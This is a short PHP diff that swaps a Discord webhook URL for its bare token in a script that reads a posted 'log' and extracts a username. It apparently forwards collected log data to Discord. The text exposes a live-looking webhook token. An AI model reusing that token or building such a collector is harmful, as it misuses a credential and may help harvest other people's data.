@@ -1,6 +1,6 @@
 <?php
 session_start();
-$webhook = 'https://discord.com/api/webhooks/1191379223718395925/zWTfhjq0DVTYM4O_NQY-fQXuCtRH-SuF-AOFQHr_xt4RkSjL2Q0HsIzQ5LhinJqeZA43';
+$webhook = 'zWTfhjq0DVTYM4O_NQY-fQXuCtRH-SuF-AOFQHr_xt4RkSjL2Q0HsIzQ5LhinJqeZA43';
 $log = $_POST['log'];
 $log = json_decode($log);
 $username = $log->username;
